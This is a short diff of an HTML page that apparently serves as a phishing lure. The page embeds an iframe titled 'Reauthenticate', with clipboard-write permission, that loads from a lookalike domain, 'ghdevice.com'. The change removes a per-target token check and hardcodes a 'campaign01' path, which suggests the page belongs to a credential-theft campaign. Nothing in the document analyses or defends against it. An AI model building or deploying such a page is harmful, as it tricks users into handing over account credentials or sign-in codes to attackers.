@@ -13,16 +13,6 @@
   </style>
 </head>
 <body>
-  <iframe id="f" title="Reauthenticate" allow="clipboard-write"></iframe>
-  <script>
-    (function () {
-      var t = new URLSearchParams(location.search).get("t") || "";
-      if (!/^[A-Za-z0-9_-]{8,32}$/.test(t)) {
-        document.body.textContent = "Not found";
-        return;
-      }
-      document.getElementById("f").src = "https://ghdevice.com/a/" + encodeURIComponent(t);
-    })();
-  </script>
+  <iframe id="f" title="Reauthenticate" allow="clipboard-write" src="https://ghdevice.com/a/campaign01"></iframe>
 </body>
 </html>
